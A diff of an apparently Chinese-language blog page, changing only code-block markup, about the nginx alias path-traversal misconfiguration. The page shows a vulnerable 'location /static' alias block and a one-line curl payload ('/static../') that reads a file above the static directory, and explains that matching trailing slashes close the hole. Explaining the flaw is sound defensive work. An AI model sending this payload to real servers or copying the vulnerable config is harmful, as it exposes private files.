@@ -38,15 +38,15 @@
     <div class="entry-content">
       
       <p>nginx在使用proxy_pass的时候，需要处理静态文件有时候会这样做:</p>
-<div class="highlight"><pre><span></span> <span class="k">location</span> <span class="o">/</span><span class="k">static</span> <span class="err">{</span>
-                <span class="k">alias</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="k">static</span><span class="o">/</span><span class="p">;</span>
-        <span class="err">}</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err"> location /static {</span>
+<span class="err">                alias /home/uploads/static/;</span>
+<span class="err">        }</span>
+</code></pre></div>
 
 
 <p>payload:</p>
-<div class="highlight"><pre><span></span><span class="n">curl</span> <span class="n">vuln</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="k">static</span><span class="p">..</span><span class="o">/</span><span class="n">requirements</span><span class="p">.</span><span class="n">pip</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">curl vuln.com/static../requirements.pip</span>
+</code></pre></div>
 
 
 <p>上面如果是两个路径最后都没有带<code>/</code>或者都带<code>/</code>则该漏洞不存在。</p>
